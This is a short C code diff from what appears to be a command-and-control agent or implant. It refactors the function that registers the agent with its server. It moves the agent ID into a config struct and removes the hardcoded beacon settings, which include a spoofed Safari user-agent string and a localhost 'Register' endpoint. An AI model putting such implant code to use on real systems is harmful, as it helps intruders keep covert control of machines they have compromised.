@@ -77,7 +77,7 @@ INT RegisterAgent(pAgent agent) {
         printf("[error] attempting to add magic value to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->AgentID)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(agent->packages, agent->config->AgentID)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add agent id to package\n");
         return -1;
     }
@@ -185,17 +185,8 @@ INT RegisterAgent(pAgent agent) {
 }
 
 BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength) {
-    Agent	new_agent = { 0 };
-    LPCWSTR UserAgent = L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1";
-    LPCWSTR HttpEndpoint = L"Register";
-    LPCWSTR HttpServer = L"127.0.0.1";
-    LPCWSTR RequestHeaders = L"Content-Type: application/x-www-form-urlencoded";
 
-
-
-
-
-    PerformRequest(agent, UserAgent, HttpEndpoint, HttpServer, Buffer, BufferLength, RequestHeaders);
+    PerformRequest(agent, Buffer, BufferLength);
 
     return 1;
 }
